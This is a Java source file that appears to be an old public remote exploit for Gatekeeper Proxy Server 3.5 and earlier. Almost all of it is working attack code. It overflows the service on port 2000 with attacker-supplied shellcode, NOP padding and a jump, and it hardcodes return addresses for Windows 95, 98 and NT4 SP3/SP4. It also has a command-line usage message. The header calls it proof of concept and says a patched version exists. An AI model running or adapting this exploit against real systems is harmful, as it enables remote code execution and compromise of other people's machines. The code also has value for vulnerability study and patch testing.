/* gkwarez.java by Andrew Lewis aka. Wizdumb
 * <wizdumb@leet.org || www.mdma.za.net || wizdumb@IRC>
 *
 * Remote exploit for Gatekeeper Proxy Server 3.5 (and prior versions?).
 * Written as proof of concept code only - the MDMA crew do not condone
 * illegal activities in any way what-so-ever.
 *
 * This code is now public - Gatekeeper version 3.6 is out. :-)
 *
 * Shellcode is handled plug and play style for flexibility and defence
 * against script kiddies. :) Oh, and coz I'm too dumb to make some and too
 * lazy to find some. :P Also note that nulls in your shellcode are fine for
 * this daemon - just beware of terminating newlines.
 *
 * Greetz to everyone in MDMA, USSRLabs, b10z, and BlabberNet's #hack
 */

import java.io.*;
import java.net.*;

class gkwarez {

public static void main(String[] args) throws IOException {

  if (args.length != 3) {
    System.out.println("Syntax: java gkwarez [host] [shellcode-file] [version]\n");
    System.out.println("Shellcode file is code you want to execute on the host");
    System.out.println("Valid versions are 95 (Win95), 98 (Win98), 3 (NT4/SP3) and 4 (NT4/SP4)");
    System.exit(1); }

  int c;
  Socket soq = null;
  char[] wet = null;
  PrintWriter white = null;
  BufferedReader hellkode = null;
  
  char nop  = 0x90;
  char[] jmpcode = { 0xE9, 0xF9, 0xEF, 0x90 };
  
  // Static addys for "call eax" (backwards) - any1 know of more? mail me. :)
  char[] retwin95 = { 0x30, 0x11, 0x71, 0x7F };
  char[] retwin98 = { 0x7B, 0xFF, 0xF7, 0xBF };
  char[] retntsp3 = { 0xC7, 0x5A, 0xFA, 0x77 };
  char[] retntsp4 = { 0x5D, 0x63, 0xF7, 0x77 };
  
  try {
    switch (Integer.parseInt(args[2])) {
      case 95:
        wet = retwin95;
        break;
      case 98:
        wet = retwin98;
        break;
      case 3:
        wet = retntsp3;
        break;
      case 4:
        wet = retntsp4;
        break;
      default:
        System.out.println("Version specified invalid: Expecting 95, 98, 3, or 4");
        System.exit(1);
        break; } } catch (Exception e) {
          System.out.println("Version specified invalid: Expecting 95, 98, 3, or 4");
          System.exit(1); }
  
  try {
    hellkode = new BufferedReader(new FileReader(args[1]));
  } catch (Exception e) {
    System.out.println("Unable to open file: " + args[1]);
    System.exit(1); }
  
  try {
    soq = new Socket(args[0], 2000);
    white = new PrintWriter(soq.getOutputStream(), true);
  } catch (Exception e) {
    System.out.println("Problems connecting :-/");
    System.exit(1); }
  
  for (int i = 0; i <= 4800; i++) {
    if ((c = hellkode.read()) != -1) {
      white.write(c);
      if (i == 4096) {
        System.out.println("Shellcode specified is too big (4095 bytes max). Bailing out...");
        System.exit(1); } }
    else {
      if (i == 4096) {
        white.print(jmpcode);
        white.print(wet); }
      else white.print(nop); } }
  white.println();
  System.out.println("Payload sent!"); } }
